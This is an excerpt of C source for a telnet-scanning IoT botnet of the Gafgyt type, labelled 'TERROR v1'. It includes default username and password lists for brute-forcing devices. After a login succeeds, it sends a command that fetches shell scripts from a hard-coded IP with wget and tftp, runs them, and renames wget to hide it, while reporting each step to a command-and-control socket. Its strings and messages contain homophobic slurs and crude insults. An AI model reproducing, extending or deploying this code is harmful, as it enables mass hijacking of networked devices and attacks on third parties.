...
char *usernames[] = {"root\0", "\0", "admin\0", "support\0"};
char *passwords[] = {"root\0", "\0", "admin\0", "support\0", "12345\0", "123456\0"};

char *whateverlol[] = {"invalid", "incorrect", "fail", "again", "wrong", "accessdenied", "error", "user", "login", "pass", "name", "word", "gayfgt", "binfagt"};
...
void StartTheLelz()
{
	...
	while(1)
	{
		...
		for(i = 0; i < max; i++)
		{
			...
			case 0:
				{
					...
					if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) { sockprintf(mainCommSock, "[%s] socket couldn't init", inet_ntoa(*(struct in_addr *)&(fds[i].ip))); sclose(fds[i].fd); fds[i].complete = 1; }
			...
			case 1:
				{
					...
					if(res == 1)
					{
						...
						if(valopt)
						{
							sockprintf(mainCommSock, "[%s] socket dead, rip", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));

							sclose(fds[i].fd);
							fds[i].state = 0;
							fds[i].complete = 1;
						} else {
							sockprintf(mainCommSock, "[%s] sockets are set up, commencing", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));
					...
					{
						sockprintf(mainCommSock, "[%s] couldn't select, rip", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));
			...
			case 2:
				{
					...
					{
						sockprintf(mainCommSock, "[%s] login prompt found", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));
					...
					if(fds[i].totalTimeout + 8 < time(NULL))
					{
						sockprintf(mainCommSock, "[%s] timed out", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));
			...
			case 3:
				{
					sockprintf(mainCommSock, "[%s] sending username %s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd]);

					if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) { sockprintf(mainCommSock, "[%s] couldn't send username", inet_ntoa(*(struct in_addr *)&(fds[i].ip))); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sockprintf(mainCommSock, "[%s] couldn't send newline", inet_ntoa(*(struct in_addr *)&(fds[i].ip))); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 4;
				}
				break;
			...
			case 5:
				{
					if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) { sockprintf(mainCommSock, "[%s] couldn't send password", inet_ntoa(*(struct in_addr *)&(fds[i].ip))); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sockprintf(mainCommSock, "[%s] couldn't send newline", inet_ntoa(*(struct in_addr *)&(fds[i].ip))); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 6;
				}
				break;
			...
			case 6:
				{
					...
					{
						sockprintf(mainCommSock, "[%s] incorrect", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));
			...
			case 8:
				{
					sockprintf(mainCommSock, "[%s] writing the gay echo -e", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));

					if(send(fds[i].fd, "echo -e '\x67\x61\x79\x66\x67\x74'\r\n", 36, MSG_NOSIGNAL) < 0) { sockprintf(mainCommSock, "[%s] error sending gayfgt confirmation", inet_ntoa(*(struct in_addr *)&(fds[i].ip))); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
			...
			case 10:
				{
					sockprintf(mainCommSock, "[%s] shitting on your moms chest", inet_ntoa(*(struct in_addr *)&(fds[i].ip)));

					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://176.123.7.140/bin.sh; sh bin.sh; wget1 http://176.123.7.140/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 176.123.7.140; sh tftp.sh; tftp 176.123.7.140 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bin/-wget;echo -e '\x62\x69\x6e\x66\x61\x67\x74'\r\n", 528, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 11;
				}
				break;
...
{
	if(!strcmp(argv[0], "CURRENTSTATE"))
	{
		sockprintf(mainCommSock, "ipState: %d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
	}
...
char *getBuild()
{
        return "TERROR v1 - 128 MAX - 8 TIMEOUT - WGET";
}
...
int main(int argc, unsigned char *argv[])
{
	...
	while(1)
	{
		...
		sockprintf(mainCommSock, "BUILD %s\nPING", getBuild());
